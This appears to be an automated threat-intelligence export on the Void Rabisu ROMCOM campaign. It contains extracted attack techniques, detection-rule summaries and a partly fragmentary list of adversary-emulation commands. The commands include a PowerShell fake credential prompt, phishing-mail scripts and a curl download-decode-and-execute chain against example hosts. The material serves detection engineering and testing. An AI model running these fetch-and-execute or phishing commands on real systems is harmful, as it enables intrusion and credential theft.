extracted_ttps.description: Void Rabisu may use phishing tactics to target conference participants, including the Munich Security Conference, Masters of Digital conference, and WPL Summit
Void Rabisu exploited the vulnerability CVE-2023-36884 in campaigns using the Ukrainian World Congress and the July 2023 NATO summit as lures
Void Rabisu uses commands and scripting interpreters, such as At and net, to execute malicious actions
Void Rabisu used a malicious copy of the official website of the Women Political Leaders (WPL) Summit to spread the ROMCOM backdoor
Void Rabisu set up a fake website wplsummit[.]com to attract visitors of the legitimate wplsummit.org domain, leading to a drive-by compromise
Void Rabisu used malicious advertisements on Google and Bing to generate search engine traffic to their lure sites
The victim is tricked into executing the malware by clicking on the 'Extract' button, which appears to be a self-extracting archive
The malware uses the Windows API to obtain a unique timestamp and generate a URL path for the next request
Void Rabisu targets female political leaders by exploiting user execution vulnerabilities, potentially through social engineering or malicious downloads
Void Rabisu targeted EU military personnel and political leaders working on gender equality initiatives
Void Rabisu signed malware with certificates likely bought from a third-party service provider

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The malware exfiltrates data over the command and control channel using HTTPS or raw TCP
The malware uses the Windows API to execute commands and send HTTP requests
The malware exploits the legitimate online service worldtimeapi.org to obtain a unique timestamp
ROMCOM backdoor has implemented more effective detection evasion techniques
The malware modifies the Windows registry to store the downloaded components
The malware uses phishing to trick the victim into executing the malware
Detected Create or Modify System Process activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Registry Run Keys activity via NLP pattern matching
Detected Remote Desktop Protocol activity via NLP pattern matching

rules.title: Phishing Campaign Targeting Conference Participants via Office Process Spawning Command Shell
rules.description: Detects potential phishing activity where an Office application (e.g., WINWORD.EXE) spawns a command shell with command lines referencing targeted conferences or containing long Base64-encoded payloads, indicating macro-based execution.

detection.condition: selection_office_process and selection_suspicious_child and not exclusion_benign_parents and (selection_indicators or selection_base64_pattern)

falsepositives: Legitimate administrative scripts launched from Office documents in rare enterprise workflows
User manually executing commands from within a document macro for debugging or automation
Training or awareness simulations that mimic phishing behavior using similar keywords

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Exploit Public-Facing Application (CVE-2023-36884)
rules.description: Detects exploitation of CVE-2023-36884 in public-facing applications, as used by Void Rabisu in campaigns using the Ukrainian World Congress and the July 2023 NATO summit as lures
falsepositives: Legitimate applications using Base64 encoding for non-malicious purposes
False positives may occur if the rule is not properly tuned for the specific environment

siem_verification.message: Verification complete

rules.title: Void Rabisu Command and Scripting Interpreter Detection
rules.description: Detects the use of commands and scripting interpreters, such as At and net, to execute malicious actions
falsepositives: Legitimate system administrators using these commands for maintenance tasks
Penetration testers using these commands for testing purposes

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Process Creation Related to ROMCOM Backdoor and WPL Summit
rules.description: Detects process creation with indicators related to ROMCOM backdoor or WPL Summit phishing, including Base64 encoded commands, spawned from explorer.exe excluding known benign parents.

detection.condition: (selection_cl_keywords or selection_cl_regex) and selection_parent and not filter_exclusions

falsepositives: Legitimate user execution of applications referencing WPL Summit
Administrative scripts using Base64 encoding

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Drive-by Compromise via Malicious Web Domain Execution
rules.description: Detects execution of scripting or command interpreters with command lines referencing the malicious domains wplsummit.com or wplsummit.org, or containing large Base64-encoded payloads, while excluding known benign parent processes.

detection.condition: (selection_process and (selection_domain or selection_base64)) and not exclusion_parent

falsepositives: Legitimate administrative scripts that download from internal repositories containing the word wplsummit in comments or variables.
Security testing tools that intentionally use Base64-encoded commands for benign purposes.
Automation frameworks that spawn PowerShell or cmd.exe processes with long Base64 strings for legitimate encoding.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Process with Time API Access or Base64 Payload
rules.description: Detects processes accessing worldtimeapi.org or containing large Base64 strings, potentially indicating Application Window Discovery activity.

detection.condition: (selection_process and (selection_command or selection_regex)) and not filter_parent

falsepositives: Legitimate system administration scripts using worldtimeapi.org for time synchronization
Developers using Base64 encoding in automation scripts

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection: Email Collection
rules.description: Void Rabisu targeted EU military personnel and political leaders working on gender equality initiatives
falsepositives: Legitimate administrative activity

siem_verification.message: Verification complete

rules.title: Masquerading via Signed Malware
rules.description: Detects masquerading attempts using signed malware with certificates likely bought from a third-party service provider
falsepositives: Legitimate software updates or installations using signed executables
Administrative tasks involving signed scripts or executables

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Process Execution with C2 Exfiltration Patterns
rules.description: Detects processes associated with potential data exfiltration over command and control channels using encoded commands or known malicious domains.

detection.condition: selection_base and (selection_domain or selection_regex) and not exclusion

falsepositives: Legitimate administrative scripts using Base64 encoding
Approved network utilities contacting whitelisted domains
Security tooling performing encoded command execution
rules.technique_name: Exfiltration Over Command and Control Channel

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection: Obfuscated Files or Information
rules.description: ROMCOM backdoor has implemented more effective detection evasion techniques
falsepositives: Legitimate administrative activity

siem_verification.message: Verification complete

rules.title: Modify Registry via Suspicious Process Creation
rules.description: Detects the creation of processes that modify the Windows registry to store downloaded components, as used by malware for persistence
falsepositives: Legitimate system updates
Application installations that modify the registry

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Process Creation with Encoded Commands
rules.description: Detects processes with Base64-encoded payloads or encoding flags spawned from suspicious parents, excluding known benign systems.

detection.condition: (selection_base64 or selection_flags) and selection_parent and user_filter and not exclusion_parent

falsepositives: Legitimate administrative scripts using encoded commands
Scheduled tasks with obfuscated parameters
Security product scanners

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Archive Collected Data via Archiving Tools and Encoded Commands
rules.description: Detects use of archiving tools to collect data with command line indicators or Base64 encoded commands, excluding common benign parent processes.

detection.condition: selection_archiver and (selection_command or selection_b64) and not filter_parents and User|exists

falsepositives: Legitimate backup operations
Administrative scripts using archivers

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Persistence via Registry Run Keys with Base64 Payload Detection
rules.description: Detects creation or modification of Registry Run Keys using reg.exe or PowerShell with encoded payloads, while excluding known benign parent processes. Correlate with recent successful logon events for the same user to reduce false positives.

detection.condition: selection or powershell_base64 and not parent_exclusion

falsepositives: Legitimate installers or software updates that add entries to HKCU/HKLM Run keys
System utilities (e.g., msiexec.exe) that configure persistence during installation
Group Policy processing that writes Run keys on behalf of administrators
Scheduled tasks or services that invoke reg.exe as part of normal operation

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Remote Desktop Protocol Usage with Encoded Command
rules.description: Detects potential lateral movement via Remote Desktop Protocol by identifying process creation events with Base64-encoded command lines, often used to obfuscate malicious commands. Includes context for valid account usage and excludes known benign parent processes.
falsepositives: Legitimate use of mstsc.exe with encoded parameters (rare but possible in automated environments)
Administrative scripts that embed configuration data in Base64 within command lines when launching RDP

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.Text = 'Phishing Example'; $form.Size = New-Object System.Drawing.Size(300,200); $form.StartPosition = 'CenterScreen'; $label = New-Object System.Windows.Forms.Label; $label.Text = 'Please enter your credentials'; $label.AutoSize = $true; $label.Location = New-Object System.Drawing.Point(10,10); $form.Controls.Add($label); $textbox = New-Object System.Windows.Forms.TextBox; $textbox.Location = New-Object System.Drawing.Point(10,30); $textbox.Size = New-Object System.Drawing.Size(260,20); $form.Controls.Add($textbox); $button = New-Object System.Windows.Forms.Button; $button.Text = 'Submit'; $button.Location = New-Object System.Drawing.Point(100,60); $button.Size = New-Object System.Drawing.Size(75,23); $form.Controls.Add($button); $form.ShowDialog()"
attacks.description: A basic PowerShell script to create a simple form that mimics a phishing attempt by asking for credentials.
attacks.expected_behavior: A form will appear asking the user to enter their credentials, simulating a phishing attempt.

attacks.description: An intermediate command using certutil to download a benign file from a URL and then open it with notepad, simulating a phishing email that leads to a malicious file download.
attacks.expected_behavior: A benign text file will be downloaded from the specified URL and opened with notepad, demonstrating how a phishing email could lead to the execution of malicious files.

attacks.command: powershell -Command "$smtpServer = 'smtp.example.com'; $msg = New-Object Net.Mail.MailMessage; $msg.From = 'example@example.com'; $msg.To.Add('target@example.com'); $msg.Subject = 'Phishing Test'; $msg.Body = 'This is a phishing test email'; $smtp = New-Object Net.Mail.SmtpClient($smtpServer); $smtp.Send($msg)"
attacks.description: An advanced PowerShell script to send an email that could be used in a phishing campaign, demonstrating the technique of using social engineering to trick targets into revealing sensitive information.
attacks.expected_behavior: An email will be sent from the specified SMTP server to the target email address with a subject and body that could be used in a phishing attempt.

attacks.command: echo 'Please click on this link: http://example.com' | mail -s 'Urgent: Update your password' user@example.com
attacks.description: Send a fake email with a phishing link
attacks.expected_behavior: Send a fake email to the target user with a phishing link

attacks.command: curl -X POST -H 'Content-Type: application/json' -d '{"text": "Please click on this link: http://example.com"}' https://example.com/api/send-message
attacks.description: Send a fake message with a phishing link using curl
attacks.expected_behavior: Send a fake message to the target user with a phishing link

attacks.command: ssh user@example.com 'echo "Please click on this link: http://example.com" | mail -s "Urgent: Update your password" user@example.com'
attacks.description: Send a fake email with a phishing link using ssh
attacks.expected_behavior: Send a fake email to the target user with a phishing link using ssh

attacks.description: Download a benign file using certutil to simulate the exploitation of a public-facing application
attacks.expected_behavior: A benign file will be downloaded to the temp directory

attacks.expected_behavior: The benign file will be executed

attacks.description: Create a directory, download a benign file, and execute it, simulating a more complex exploitation scenario
attacks.expected_behavior: A directory will be created, a benign file will be downloaded and executed

attacks.description: Basic exploitation attempt using curl to download and execute a script from a potentially malicious URL.
attacks.expected_behavior: The command attempts to download a script from a specified URL and execute it using bash, simulating the exploitation of a public-facing application vulnerability.

attacks.description: Intermediate exploitation attempt using wget to download a payload, making it executable, and then running it.
attacks.expected_behavior: This command downloads a file, changes its permissions to make it executable, and then runs it, simulating a more complex exploitation scenario.

attacks.description: Advanced exploitation attempt using Python to send a GET request to a potentially vulnerable URL, simulating exploitation.
attacks.expected_behavior: This command uses Python to send a request to a specified URL, simulating the exploitation of a vulnerability in a public-facing application.

attacks.expected_behavior: A new user is added to the system

attacks.expected_behavior: The benign file will be downloaded and executed

attacks.expected_behavior: The benign file will be downloaded and executed

attacks.expected_behavior: The Base64 string will be decoded and the decoded file will be executed

attacks.expected_behavior: The command will create a malicious script, make it executable, and then execute it.

attacks.expected_behavior: The command will download a malicious script from a URL and execute it.

attacks.description: Advanced command to clone a malicious repository and execute a script

attacks.expected_behavior: Downloads the file to the temporary directory.

attacks.expected_behavior: Downloads the script to the temporary directory.

attacks.expected_behavior: Executes the malicious executable.

attacks.expected_behavior: Downloads a Python script from a specified URL and executes it using Python 3

attacks.command: curl -s http://example.com/encoded_payload | base64 -d > payload.sh; chmod +x payload.sh; ./payload.sh
attacks.description: Advanced drive-by compromise using curl to download an encoded script, decoding it, and then executing
attacks.expected_behavior: Downloads an encoded script, decodes it using base64, makes it executable, and then executes it

attacks.description: Lists all windows on the desktop, including their window IDs and geometry.
attacks.expected_behavior: Output will display a list of windows, including their IDs, positions, and sizes.

attacks.expected_behavior: Output will display the window IDs of visible Terminal windows.

attacks.expected_behavior: Output will display a list of managed windows with their details.

attacks.description: Search for files containing 'email' in the user's documents directory
attacks.expected_behavior: Displays files containing the string 'email' in the console

attacks.description: Search for the string 'email' in files within the %TEMP% directory
attacks.expected_behavior: Lists files in %TEMP% containing the string 'email'

attacks.description: Display the contents of a 'contacts.txt' file in the temp directory, assuming it contains email addresses
attacks.expected_behavior: Displays the contents of 'contacts.txt' in the console, if the file exists

attacks.description: Search for email addresses in files within the user's home directory
attacks.expected_behavior: The command will print out any email addresses found in the files within the specified directory.

attacks.expected_behavior: The command will print out any email addresses found in .eml files within the user's home directory.

attacks.expected_behavior: The command adds a certificate to the Root store, which could be used to masquerade malicious software as trusted.

attacks.command: powershell -Command "& {$sig = Get-AuthenticodeSignature -FilePath '%TEMP%\test.exe'; if ($sig.Status -eq 'Valid') {Write-Host 'Signature is valid'} else {Write-Host 'Signature is not valid'}}"
attacks.description: Use PowerShell to check the authenticity of a file's digital signature, simulating the verification process for potentially masqueraded malware.
attacks.expected_behavior: The command checks the digital signature of a file and outputs whether it is valid or not, demonstrating how masquerading could be detected.

attacks.description: Create a self-signed certificate using makecert.exe and add it to the Root store, simulating the creation of a certificate that could be used for masquerading.
attacks.expected_behavior: The command creates a self-signed certificate and adds it to the Root store, which could then be used to sign and masquerade malicious files as legitimate.

attacks.description: Generate a self-signed certificate using OpenSSL
attacks.expected_behavior: A self-signed certificate and private key are generated in the current directory.

attacks.command: openssl smime -sign -in test.txt -out signed_test.txt -signer cert.pem -inkey key.pem
attacks.description: Sign a test file using the generated certificate and private key
attacks.expected_behavior: A signed version of the test file is generated in the current directory.

attacks.description: Install the self-signed certificate as a trusted certificate authority (requires admin privileges)
attacks.expected_behavior: The self-signed certificate is installed as a trusted certificate authority, allowing signed files to be verified without warnings.

attacks.expected_behavior: The decoded command is executed, potentially requiring admin privileges to run successfully.
